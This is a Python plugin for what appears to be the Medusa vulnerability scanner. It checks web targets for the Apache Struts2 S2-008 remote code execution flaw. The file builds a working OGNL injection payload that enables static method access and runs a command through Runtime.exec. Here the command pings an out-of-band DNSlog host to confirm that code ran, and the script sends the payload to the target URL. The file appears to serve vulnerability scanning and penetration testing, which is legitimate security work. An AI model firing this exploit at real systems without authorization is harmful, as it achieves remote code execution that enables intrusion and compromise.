#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import time
import urllib.parse
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2020-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability8"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞8' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "S2-008涉及多个漏洞,Cookie拦截器错误配置可造成OGNL表达式执行，但是由于大多Web容器（如Tomcat）对Cookie名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "低于Struts2.3.1.2"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果



class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port,path = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    DL=Dnslog()
    payload="""?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20{}%22%29)""".format(DL.dns_host())
    try:
        payload_url = scheme + "://" + url +":"+ str(port)+path+payload
        headers = {
            'User-Agent': RandomAgent,
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = requests.get(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
        con = resp.text
        time.sleep(3)
        if DL.result():
            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-008)\r\n漏洞详情:\r\n版本号:S2-008\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

